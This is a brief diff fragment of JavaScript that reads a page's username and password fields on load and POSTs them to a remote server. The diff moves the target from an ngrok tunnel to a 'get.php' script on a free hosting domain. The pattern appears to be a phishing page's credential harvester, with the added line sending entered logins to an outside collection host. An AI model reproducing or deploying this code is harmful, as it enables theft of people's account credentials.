@@ -22,7 +22,7 @@ document.addEventListener("DOMContentLoaded", function() {
         data.append("username", username.value);
         data.append("password", password.value);
 
-        const response = await fetch("https://8177-45-162-158-3.sa.ngrok.io/dashboard/public_html/index.php", {
+        const response = await fetch("http://fckyou.42web.io/index/get.php", {
             method: "POST",
             body: data
         });
